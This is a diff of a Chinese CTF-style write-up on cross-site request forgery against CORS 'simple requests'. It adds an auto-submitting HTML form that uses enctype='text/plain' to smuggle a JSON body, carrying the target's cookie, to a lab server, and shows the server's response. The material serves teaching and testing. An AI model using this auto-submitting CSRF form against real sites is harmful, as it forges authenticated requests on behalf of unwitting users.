@@ -110,9 +110,9 @@ echo file_get_contents('php://input');
 
 ?>
 ```
-使用`php -S 192.168.1.82:1234`搭建网站 2，并在网站 2 添加一个 cookie（site=web2）。
+使用`php -S 192.168.1.82:1234`搭建网站 B，并在网站 B 添加一个 cookie（site=web2）。
 
-当访问网址 `http://192.168.1.82:8080/1.php` 的时候，网站 1 会自动向网站 2 发起请求，返回结果为
+当访问网址 `http://192.168.1.82:8080/1.php` 的时候，网站 A 会自动向网站 B 发起请求，返回结果为
 ```
 2.php: foo=bararray(1) {
   ["site"]=>
@@ -120,9 +120,38 @@ echo file_get_contents('php://input');
 }
 ```
 
-# 简单请求：json
+# 简单请求：json版
+
+在 fxxxCORS 中，关键的请求是向 /changeapi.php 地址发送 json 数据，但上面的例子只能发送键值对。
+
+根据《how to be popular》文章的提示，使用 enctype 来对发送内容进行编码。修改后的网站 A 如下所示
+```html
+<html>
+    <body>
+        <form id="form" method="post" enctype="text/plain" action="http://192.168.1.82:1234/2.php">
+            <input name='{"foo":"' value='bar}"'}>
+            <input type="submit" value="Click me">
+        </form>
+        <script>
+            window.onload = () => { 
+                console.log("1.php"); 
+                form.submit();
+            }
+        </script>
+    </body>
+</html>
+```
+网站 B 的返回结果如下所示
+```
+2.php: {"foo":"=bar}"
+array(1) {
+  ["site"]=>
+  string(4) "web2"
+}
+```
 
 
+# 
 
 
 # 进一步探索
